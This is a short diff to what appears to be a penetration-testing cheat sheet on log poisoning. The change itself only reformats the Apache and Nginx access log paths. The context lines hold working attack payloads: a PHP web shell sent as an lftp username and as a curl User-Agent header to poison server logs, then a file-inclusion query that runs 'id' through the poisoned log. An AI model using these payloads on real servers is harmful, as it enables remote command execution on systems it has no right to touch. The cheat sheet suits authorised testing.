@@ -332,9 +332,8 @@ lftp -u '<?php system($_GET["cmd"]); ?>', 192.168.1.2
 
 # <kbd>Log Poisoning HTTP</kbd>
 
-> /var/log/apache2/access.log
->
-> /var/log/nginx/access.log
+- Apache2: `/var/log/apache2/access.log`
+- Nginx: `/var/log/nginx/access.log`
 
 ```cmd
 curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2"
@@ -344,9 +343,8 @@ curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2"
 User-Agent: <?php system($_GET['cmd']); ?>
 ```
 
-> /var/log/apache2/access.log&cmd=id
-> 
-> /var/log/nginx/access.log&cmd=id
+Apache2: file.php?file=`/var/log/apache2/access.log&cmd=id`
+Nginx: file.php?file=`/var/log/nginx/access.log&cmd=id`
 
 ---
 
